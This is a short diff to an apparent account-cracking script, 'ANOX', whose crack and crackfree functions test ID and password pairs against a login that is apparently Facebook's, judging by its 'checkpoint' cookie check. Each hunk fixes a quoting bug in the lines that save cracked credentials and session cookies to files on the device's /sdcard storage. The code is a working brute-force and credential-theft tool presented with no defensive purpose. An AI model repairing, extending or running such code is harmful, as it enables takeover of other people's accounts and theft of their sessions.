@@ -620,7 +620,7 @@ def crack(idf,pwv):
             if "checkpoint" in po.cookies.get_dict().keys():
                 print(f'\r\033[0;94m[ANOX-Cp] {idf} • {pw}')
                 os.system('espeak -a 300 " Cp,"')
-                open('/sdcard/ANOX-CP.txt,'a').write(idf+'|'+pw+'\n')
+                open('/sdcard/ANOX-CP.txt','a').write(idf+'|'+pw+'\n')
                 akun.append(idf+' • '+pw)
                 cp+=1
                 break
@@ -661,7 +661,7 @@ def crackfree(idf,pwv):
             if "checkpoint" in po.cookies.get_dict().keys():
                 print(f'\r\033[0;95m[{time.strftime("%H:%M")}•Tutul-Cp] {idf} • {pw}')
                 os.system('espeak -a 300 " Cp,"')
-                open('/sdcard/ANOX-CP.txt,'a').write(idf+'|'+pw+'\n')
+                open('/sdcard/ANOX-CP.txt','a').write(idf+'|'+pw+'\n')
                 akun.append(idf+' • '+pw)
                 cp+=1
                 break
@@ -670,7 +670,7 @@ def crackfree(idf,pwv):
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print(f'\r\033[10;92m[{time.strftime("%H:%M")}•anox-Ok] {idf} • {pw} ')
-                open('/sdcard/ANOX-OK.txt,'a').write(idf+'|'+pw+'|'+kuki+'n')
+                open('/sdcard/ANOX-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'n')
                 break
                 
             else:
